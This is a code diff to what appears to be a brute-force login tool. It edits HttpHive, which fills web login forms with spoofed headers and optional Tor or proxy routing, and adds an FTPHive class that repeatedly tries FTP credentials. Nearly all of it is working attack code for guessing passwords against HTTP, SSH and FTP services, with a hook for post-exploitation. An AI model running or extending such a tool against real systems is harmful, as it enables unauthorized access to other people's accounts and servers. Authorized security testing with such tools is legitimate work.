@@ -389,9 +389,9 @@ class HttpHive(Hive):
 			self.examplePayload = payload
 		else:
 			if not self.username:
-				self.examplePayload = self.url + '?%s=%s&%s=%s'%(self.username_field_name,'username_here',self.password_field_name,'password_here')
+				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,'username_here',self.password_field_name,'password_here')
 			else:
-				self.examplePayload = self.url + '?%s=%s&%s=%s'%(self.username_field_name,self.username,self.password_field_name,'password_here')
+				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,self.username,self.password_field_name,'password_here')
                 return payload
 
 	# function: __getLoginForm__ 
@@ -423,10 +423,10 @@ class HttpHive(Hive):
 		headers = self.getSpoofedHeaders()
 		# Using POST method authentication
 		if self.form_method == 0:
-			response = requests.post(self.url, data=self.basePayload,headers=headers,proxies=self.proxies)	
+			response = requests.post(self.target, data=self.basePayload,headers=headers,proxies=self.proxies)	
 		# Using GET method authentication
 		else:
-			response = requests.get(self.url+'?%s=%s&%s=%s'%(self.username_field_name,self.basePayload[self.username_field_name],
+			response = requests.get(self.target+'?%s=%s&%s=%s'%(self.username_field_name,self.basePayload[self.username_field_name],
 									self.password_field_name,self.basePayload[self.password_field_name]),headers=headers,proxies=self.proxies)
 		if self.checkSuccess(response):
 			return True
@@ -452,7 +452,7 @@ class HttpHive(Hive):
                 failedbaseline = dict()
                 payload[self.username_field_name] = 'user'
                 payload[self.password_field_name] = 'pass'
-                response = requests.post(self.url, data=payload,headers=self.getSpoofedHeaders(),proxies=self.proxies)
+                response = requests.post(self.target, data=payload,headers=self.getSpoofedHeaders(),proxies=self.proxies)
                 failedbaseline['response'] = response
                 failedbaseline['url'] = response.url
                 failedbaseline['html'] = response.text
@@ -463,13 +463,12 @@ class HttpHive(Hive):
 	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
 	def setup(self):
 		Hive.setup(self)
-		html = requests.get(self.url,headers=self.getSpoofedHeaders(),proxies=self.proxies).text
+		html = requests.get(self.target,headers=self.getSpoofedHeaders(),proxies=self.proxies).text
 		forms = self.__findForms__(html)
 		login = self.__getLoginForm__(forms)
 		self.basePayload = self.__findFields__(login)
 		self.setFailedBaseline(self.basePayload)
 		self.setOnSuccessHandle(self.postExploit)
-		self.target = self.url
 		if self.useTor:
 			self.setupTOR()
 	
@@ -524,7 +523,7 @@ class SSHHive(Hive):
 		Hive.__init__(self)
 		
 	# function: attemptLogin	- Overriden
-	# param: Credential		- THe credential to attempt a login with	
+	# param: Credential		- The credential to attempt a login with	
 	# return: Boolean		- True if Success | False if Failure
 	# description: This function is responsible for attempting a login with the specified credential, calls other helper functions to get the job done
 	def attemptLogin(self,credential):
@@ -559,3 +558,39 @@ class SSHHive(Hive):
 	# description: This is another example of a post exploit function, as you can see it requires a credential object
 	def postExploit(self,credential):
 		pass
+
+# class: FTPHive
+# description: Hive used to brute-force FTP Logins
+class FTPHive(Hive):
+	ftp = None
+	def __init__(self):
+		Hive.__init__(self)
+		self.FTPLock = threading.Lock()
+	
+	# function: attemptLogin	- Overriden
+	# param: credential		- The credential to attempt a login with
+	# return: Boolean		- True if Success | False if Failure
+	# description: This function is responsible for attempting a login with the specified credential
+	def attemptLogin(self, credential):
+		success = False
+		Hive.attemptLogin(self, credential)
+		username = credential.username
+		password = credential.password
+		host = credential.host
+		try:
+			self.ftp = FTP(host)
+			result = self.ftp.login(username,password)
+			# If result then this was a successful login
+			if result:
+				success = True
+			self.ftp.close()
+		except:
+			pass
+		return success 
+				
+	
+	# function: setup
+	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
+	def setup(self):
+		Hive.setup(self)	
+
